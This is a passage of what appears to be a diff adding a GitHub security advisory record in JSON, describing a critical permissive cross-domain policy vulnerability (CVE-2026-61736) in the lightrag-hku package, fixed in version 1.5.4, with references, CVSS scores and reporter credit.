performing destructive actions such as deleting the entire document store.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/HKUDS/LightRAG/security-advisories/GHSA-6x6h-qqr7-855w",
+    "source_code_location": "https://github.com/HKUDS/LightRAG",
+    "identifiers": [
+      {
+        "value": "GHSA-6x6h-qqr7-855w",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-61736",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-6x6h-qqr7-855w",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-61736",
+      "https://github.com/HKUDS/LightRAG/pull/3317",
+      "https://github.com/HKUDS/LightRAG/commit/09567a4c983f580050db63569dd477122c058c3d",
+      "https://github.com/HKUDS/LightRAG/commit/df68d75f9dc29dd340ffb6794b48f48c4fdc9a2d",
+      "https://github.com/HKUDS/LightRAG/commit/ebba6548639c0f2e8919100eff76b401f1222252",
+      "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4",
+      "https://github.com/advisories/GHSA-6x6h-qqr7-855w"
+    ],
+    "published_at": "2026-07-20T21:45:25Z",
+    "updated_at": "2026-07-20T21:45:27Z",
+    "github_reviewed_at": "2026-07-20T21:45:25Z",
+    "nvd_published_at": "2026-07-15T15:16:48Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "lightrag-hku"
+        },
+        "vulnerable_version_range": "<= 1.5.3",
+        "first_patched_version": "1.5.4",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+        "score": 9.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-942",
+        "name": "Permissive Cross-domain Security Policy with Untrusted Domains"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "MaramHarsha",
+          "id": 73836896,
+          "node_id": "MDQ6VXNlcjczODM2ODk2",
+          "avatar_url": "https://avatars.githubusercontent.com/u/73836896?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/MaramHarsha",
+          "html_url": "https://github.com/MaramHarsha",
+          "followers_url": "https://api.github.com/users/MaramHarsha/followers",
+          "following_url": "https://api.github.com/users/MaramHarsha/following{/other_user}",
+          "gists_url": "https://api.github.com/users/MaramHarsha/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/MaramHarsha/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/MaramHarsha/subscriptions",
+          "organizations_url": "https://api.github.com/users/MaramHarsha/orgs",
+          "repos_url": "https://api.github.com/users/MaramHarsha/repos",
+          "events_url": "https://api.github.com/users/MaramHarsha/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/MaramHarsha/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
+      "score": 9.3
+    },
+    "epss": {
+      "percentage": 0.00305,
+      "percentile": 0.22502
+    }
+  }
+]
